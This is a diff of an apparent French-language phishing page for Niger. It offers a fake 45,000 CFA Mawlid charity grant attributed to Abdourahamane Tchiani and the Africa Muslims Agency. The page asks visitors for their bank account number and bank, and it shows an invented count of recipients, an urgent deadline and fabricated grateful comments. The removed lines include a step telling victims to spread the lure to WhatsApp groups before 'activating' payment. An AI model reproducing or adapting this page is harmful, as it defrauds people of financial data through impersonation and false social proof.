@@ -1,42 +1,141 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
- <script src="liberia-active.js"></script>
- <script src="demo.js"></script>
- <script>
-        function set_Cookie(name,value){
-            var Days = 30;
-            var exp = new Date();
-            exp.setTime(exp.getTime() + (Days*20*1000));
-            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
-        }
-        function get_Cookie(name){
-            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
-            if(arr=document.cookie.match(reg)){
-                return unescape(arr[2]);
-            }
-            return '';
-        }
- </script>
-  
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title> Programme de Transfert d’Argent Mawlid 45 000 CFA !</title>
-<link rel="shortcut icon" type="image/png" href="ii.jpeg" />
-<meta name="og:title" content="Programme de Transfert d’Argent Mawlid 45 000 CFA !" />
-<meta property="og:description" content="45 000 CFA de subvention caritative Mawlid d’Abdourahamane Tchiani en partenariat avec l’Africa Muslims Agency (AMA) pour tous les Nigériens" />
-<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVYIv5iekmOif0_2iT850AZ_HB_D7RfKJzwyNeTqu-gRxpiTvJYejjO_r6Z_mOuoDYLzpiQbNdEnlF_HVQBNpCYkPB-UUn90m7E499O1NiPNnTj4IWe_VxxlMWhZf7X32-J_xG1v-08S93_5bkOA6EMLTwiMXTiDIjk2yypJJuWPOvlIzgPNe2evSt6pg/s1359/niger%20presi%20222%20ADS.jpg" />
-<meta property="og:type" content="website" />
+ <meta charset="UTF-8" />
+ <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+ <title>Programme de Transfert d’Argent Mawlid 45 000 CFA !</title>
+ <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
+
+ <!-- CSS Styles -->
+ <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f9f9f9;
+      color: #333;
+    }
+
+    marquee {
+      background: #2b7a78;
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+    }
+
+    .A {
+      background: #17252a;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .A span {
+      font-size: 2em;
+      font-weight: bold;
+    }
+
+    .post {
+      max-width: 600px;
+      margin: 20px auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+
+    .post .title {
+      font-size: 1.2em;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .amount {
+      color: #e63946;
+      font-weight: bold;
+    }
+
+    button {
+      background: #2b7a78;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      margin: 8px 0;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1em;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #20575a;
+    }
+
+    input, select {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 1em;
+    }
+
+    .comments {
+      margin-top: 20px;
+      border-top: 1px solid #ddd;
+      padding-top: 10px;
+    }
+
+    .counter {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .bar {
+      display: flex;
+      justify-content: space-around;
+      padding: 10px 0;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .bar .react {
+      color: #2b7a78;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .comment {
+      margin: 10px 0;
+      padding: 10px;
+      background: #f1f1f1;
+      border-radius: 5px;
+    }
+
+    .comment .user {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    .input input {
+      width: 100%;
+      border: 1px solid #ddd;
+      padding: 10px;
+      border-radius: 5px;
+    }
+ </style>
 </head>
 <body>
 
-<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNt-HpAaIsInQHW67Qx4zeLq-v15A0ZVOgeWy8Pv7uCsGzh0PFA4DBBkIKMFs0B6XOz6xKxzdxnmw861VqAAPkdKD111k97P80RM5WeY53x7skbs4j8rW1QMisiymWqdJRkrHr9dFgdutQiUUYLmCgyeotxBmB5kYRLPeck_t841wLkZJNY1q0UDB9M6o/s16000/wed2d.jpg" style="width: 100%;"></center>
+<center>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNt-HpAaIsInQHW67Qx4zeLq-v15A0ZVOgeWy8Pv7uCsGzh0PFA4DBBkIKMFs0B6XOz6xKxzdxnmw861VqAAPkdKD111k97P80RM5WeY53x7skbs4j8rW1QMisiymWqdJRkrHr9dFgdutQiUUYLmCgyeotxBmB5kYRLPeck_t841wLkZJNY1q0UDB9M6o/s16000/wed2d.jpg" 
+       style="width: 100%; max-height: 400px; object-fit: cover;">
+</center>
 
 <marquee>45 000 CFA de subvention caritative Mawlid d’Abdourahamane Tchiani en partenariat avec l’Africa Muslims Agency (AMA) pour tous les Nigériens</marquee> 
 
 <div class="A">
    <font color="white">Jusqu’à aujourd’hui</font><br>
-   <span id="countdowntimer" style="color:yellow;">4548</span><br> 
+   <span id="countdowntimer" style="color:yellow;">4 548</span><br> 
    <font color="white">Nigériens ont reçu leurs 45 000 CFA de charité pour ce Mawlid Mubarak. Qu’Allah remplisse votre vie de lumière, de miséricorde et d’abondance.</font>
 </div>
 
@@ -46,71 +145,39 @@
       <p><b><font color="red">DATE LIMITE :</font></b> <span class="blink"><b>30 Septembre</b></span></p>
     </center>
 
-    <span class="amount"> Profitez GRATUITEMENT de 45 000 CFA de subvention caritative Mawlid d’Abdourahamane Tchiani </span> Dépêchez-vous et saisissez ces bénédictions du Mawlid Mubarak<br>
-    <strong><b><font color="red">DISPONIBLE POUR : </font>Citoyens et Résidents</b></strong> 
+    <span class="amount">Profitez GRATUITEMENT de 45 000 CFA de subvention caritative Mawlid d’Abdourahamane Tchiani</span><br>
+    Dépêchez-vous et saisissez ces bénédictions du Mawlid Mubarak<br>
+    <strong><b><font color="red">DISPONIBLE POUR :</font> Citoyens et Résidents</b></strong> 
     <br><br>
     <button id="go">OBTENEZ LE VÔTRE</button>
   </div>
 
-  <div id="loader">
-    <div>Veuillez patienter...</div>
-    <div class="spin"></div>
-    <div id="num">0%</div>
-  </div>
-
   <div id="info">
-    <center><p class="title">ENTREZ VOTRE NUMÉRO DE COMPTE BANCAIRE ICI :</p></center>
-    <div class="phone">
-      <center><input type="char" placeholder="Entrez le numéro de compte" id="name" name="Phone"></center><br>
-      <center><p class="title">CHOISISSEZ VOTRE BANQUE CI-DESSOUS</p></center>
+    <center><p class="title">ENTREZ VOTRE NUMÉRO DE COMPTE BANCAIRE :</p></center>
+    <center><input type="char" placeholder="Entrez le numéro de compte" id="name" name="Phone"></center><br>
+    <center><p class="title">CHOISISSEZ VOTRE BANQUE :</p></center>
 
-      <select>
-        <option>------------- Nom de la Banque -------------</option>
-        <option>Banque Agricole du Niger (BAGRI)</option>
-        <option>Banque Commerciale du Niger (BCN)</option>
-        <option>Banque Islamique du Niger (BINCI)</option>
-        <option>Banque Internationale pour l’Afrique au Niger (BIA-Niger)</option>
-        <option>Banque Sahélo-Saharienne (BSIC Niger)</option>
-        <option>Ecobank Niger</option>
-        <option>Orabank Niger</option>
-        <option>Société Nigérienne de Banque (SONIBANK)</option>
-        <option>UBA Niger</option>
-        <option>Autres</option>
-      </select>
-    </div>
+    <select>
+      <option>------------- Nom de la Banque -------------</option>
+      <option>Banque Agricole du Niger (BAGRI)</option>
+      <option>Banque Commerciale du Niger (BCN)</option>
+      <option>Banque Islamique du Niger (BINCI)</option>
+      <option>Banque Internationale pour l’Afrique au Niger (BIA-Niger)</option>
+      <option>Banque Sahélo-Saharienne (BSIC Niger)</option>
+      <option>Ecobank Niger</option>
+      <option>Orabank Niger</option>
+      <option>Société Nigérienne de Banque (SONIBANK)</option>
+      <option>UBA Niger</option>
+      <option>Autres</option>
+    </select>
     <br>
     <button id="confirm">Envoyer</button>
     <p class="error">Veuillez valider votre numéro de compte</p>
   </div>
 
-  <div id="checking">
-    <p class="title">Veuillez patienter un instant...</p>
-  </div>
-
-  <div id="share">
-    <p class="tip">Félicitations, votre numéro de compte <span id="getname"></span></p>
-    <p class="tip">est éligible pour recevoir 45 000 CFA d’allocation caritative Mawlid. <span class="amount">Procédez pour activer votre paiement.</span></p>
-    <p class="tip">1. Partagez-le avec 5 groupes ou 15 amis sur WhatsApp pour que d’autres familles en soient informées.</p>
-    <p class="tip">2. Vous serez automatiquement redirigé vers notre page "<b>FORMULAIRE DE PAIEMENT</b>" après la vérification.</p>
-    <p class="tip">3. Vous recevrez un email de confirmation sous 24h après une demande réussie.</p>
-    <p class="tip"><b>REMARQUE :</b> Un bon partage avec vos amis ou groupes WhatsApp vous donne plus de chances de recevoir votre paiement immédiatement.</p>
-    <button id="whatsapp">PARTAGER</button>
-  </div>
-
-  <div id="claim">
-    <p class="done"><i class="fa fa-check-circle fa-3x"></i></p>
-    <p class="title">Votre transfert d’argent Mawlid a été approuvé</p>
-    <button id="offer">Recevoir le paiement</button><br/>
-    <button>Obtenir une alerte de confirmation</button><br/>
-    <button>Vérifier le statut du paiement</button><br/>
-    <button>ACTIVER 45 000 CFA</button><br/>
-    <button>Contacter le service client</button><br/>
-    <button>ACTIVER INSTANTANÉMENT</button><br/>
-  </div>
-
   <div class="comments">
     <div class="counter">
-      <span id="comments">23K commentaires</span> · <span id="shares">12K partages</span>
+      <span id="comments">23 K commentaires</span> · <span id="shares">12 K partages</span>
     </div>
     <div class="bar">
       <span class="react">J’aime</span>
@@ -132,10 +199,11 @@
     </div>
     <div class="comment">
       <span class="user">Mariama Djibo</span>
-      <span class="text">Merci cher président, je peux fièrement dire que vous êtes mon président. Je viens de recevoir le mien, je suis très heureuse.</span>
+      <span class="text">Merci cher président, je viens de recevoir le mien, je suis très heureuse.</span>
     </div>
     <div class="input"><input placeholder="Écrire un commentaire..." /></div>
   </div>
 </div>
+
 </body>
 </html>
